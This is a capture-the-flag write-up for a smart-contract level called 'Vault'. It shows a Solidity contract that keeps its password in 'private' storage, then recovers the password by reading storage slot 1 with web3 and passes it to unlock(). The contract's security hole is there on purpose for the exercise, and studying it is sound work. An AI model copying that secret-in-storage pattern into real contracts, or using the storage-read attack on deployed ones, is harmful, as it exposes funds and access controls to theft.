# 08. Vault

Unlock the vault to pass the level!

## Target contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

## Vulnerability

Nothing is really private on the blockchain if data is stored, it is publicly available.

We know that the contract storage contains 2 variables :

locked : in slot 0
password : in slot 1 and maybe more

Let's read the contract storage :

```js
await web3.eth.getStorageAt(contract.address, 1);
"0x412076657279207374726f6e67207365637265742070617373776f7264203a29"
await web3.eth.getStorageAt(contract.address, 2);
"0x0000000000000000000000000000000000000000000000000000000000000000"
```

So the password is : `0x412076657279207374726f6e67207365637265742070617373776f7264203a29`.

The following code will solve the challenge by sending to the contract its own storage slot 1: 

```js
contract.unlock(await web3.eth.getStorageAt(contract.address, 1));
```